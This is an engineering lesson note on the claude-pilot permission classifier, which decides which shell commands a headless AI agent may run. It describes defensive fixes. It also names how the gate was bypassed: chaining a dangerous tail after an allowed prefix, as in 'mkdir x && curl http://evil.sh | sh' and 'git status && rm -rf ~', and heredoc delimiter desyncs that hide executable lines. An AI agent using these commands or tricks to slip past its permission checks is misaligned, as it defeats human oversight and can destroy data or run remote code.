---
title: "Command-string policy allow rules are compound-unsafe; never lex shell grammar in a security gate"
date: 2026-06-03
module: claude_pilot.policy
component: permission-classifier
problem_type: security_issue
category: security-issues
severity: critical
tags: [permissions, policy, bash, regex, heredoc, allow-list, rce, claude-pilot-25]
applies_when: "adding or reviewing any rule that decides allow/deny on a raw shell command string"
---

# Command-string policy allow rules are compound-unsafe

## Context

claude-pilot's deterministic permission policy (`src/claude_pilot/policy.py`)
gates what a headless pilot may run. `policy.evaluate` matches each rule's regex
with a single `re.search` against the **whole** command string, first-match-wins —
no compound splitting, no danger scan (those live only in `tier1.py`, already
bypassed by the time the policy evaluator runs). claude-pilot#25 added dev-pilot
Bash rules (`mkdir`/`cp`/`mv`/`rm`/`cargo`/`npm`/`uv`/`node`/`export PATH`). Five
adversarial review passes — several executing candidate exploits against real
bash — turned a plausible first cut into a sound gate. The journey is the lesson.

## Guidance

### 1. A whole-string `allow` regex is compound-unsafe by construction — back it with an ALLOW-LIST, not a denylist

`^mkdir` matches `mkdir x && curl http://evil.sh | sh`. The dangerous tail rides
the allowed prefix. The first fix re-applied `is_tier3_dangerous` (a **denylist**)
before honoring an allow — insufficient: a denylist is incomplete by nature.
`curl|sh`, `./payload`, `pip/npm/python install`, `chmod`, `dd`, `node -e` are not
on it. The same latent flaw already affected the pre-existing groom rules
(`git status && rm -rf ~` matched `^git\s+status`).

The sound backstop mirrors `tier1`'s **allow-list** over every compound segment:
split the command, and admit it only if **each** segment is independently
tier1-safe (`is_safe_bash_command`) or itself a clean (non-tier3) policy allow.
Also forbid command substitution (`$(`, backtick, `$'`) outright on the allow
path, veto backgrounding `&`, and veto `<<<` here-strings. See
`_bash_allow_is_chain_safe` in `src/claude_pilot/permissions.py`.

```python
# WRONG — denylist over a whole-string allow: chained non-tier3 tail rides through
if pd.decision == "allow" and not is_tier3_dangerous(command):
    return allow  # `mkdir x && curl evil | sh` -> ALLOW

# RIGHT — allow-list over every segment (mirrors tier1)
for seg in _split_compound_command(command):
    if is_safe_bash_command(seg):           # tier1 allow-list
        continue
    pd = evaluate(policy, "Bash", {"command": seg})
    if pd.decision == "allow" and not is_tier3_dangerous(seg):
        continue
    return False                            # chained dangerous/unknown tail -> veto
```

### 2. Never approximate a shell's heredoc/here-string grammar with line-based regexes in a security gate

Four consecutive review passes each found a distinct heredoc desync where the
classifier's idea of "where the heredoc closes" diverged from bash's, hiding an
executable command in what the classifier treated as inert body:

- `<<<` here-string mis-read as a heredoc opener (`_strip_heredoc_bodies` ate the
  executable lines after it).
- A command chained **after** the terminator line.
- A command chained **before** `<<` (bash attaches the heredoc to the **last**
  command on the opener line).
- `<<EOF.` — bash's delimiter **word** includes non-`\w` chars (`. / @ : + =`), so
  a `\w+` capture under-captures and the classifier closes **later** than bash.

Patching each variant is whack-a-mole. The durable fix **removes the lexer**:
hard-code the delimiter to a literal `EOF` and full-line-anchor the one sanctioned
shape (`cat > /tmp/<token> <<EOF`). With a fixed delimiter there is nothing to
mis-parse — the close-point cannot diverge from bash's. See
`_is_sanctioned_pure_heredoc` / `_SANCTIONED_HEREDOC_OPENER_RE`.

General principle: when a static check must agree with a shell's parse, **fix the
variable rather than parse it** (or shell out to a real lexer), and pin it with a
**differential test against real bash** (run the construct, assert the gate denies
iff bash would execute something dangerous).

### 3. Permission-classifier changes need executed-exploit review, not reasoning-only review

The initial implementation — and even the operator-approved "re-apply
`is_tier3_dangerous`" framing — shipped a P0 RCE. Every break was found by an
adversarial reviewer **running** candidate command strings (several against real
bash), not by reading the diff. Budget multiple executed-exploit passes for any
change to the safety surface; treat "I reasoned it's safe" as unproven.

## When to Apply

- Adding/reviewing any `permissions.yaml` rule, or any code deciding allow/deny on
  a raw shell command string.
- Reviewing `tier1.py` / `policy.py` / `permissions.py` in claude-pilot.

## Related

- `tier1.py` already auto-approves `cargo`/`npm`/`npx` standalone, so those #25 AC
  items were partly redundant at the policy layer; the genuinely-uncovered
  footprint was `mkdir`/`export PATH`/`cp`/`mv`/`rm`/`uv`/`node`.
- **Paired-audit candidate:** mika's Rust `permission_pre_classifier.rs`
  (`contains_unquoted_metacharacter` mirrors tier1; mika#944/#946). The
  denylist-incompleteness and the `awk`/`sed`/`find` `system()`-exec gap likely
  exist symmetrically there.
- Accepted residuals (not bugs): in-worktree code execution (`node ./build.js`,
  `cargo test`, `uv run pytest` run project code — the worktree is the trust
  boundary); `npm install`/`uv add` run package scripts; `/tmp` heredoc
  symlink/TOCTOU is a runtime concern outside static policy scope.
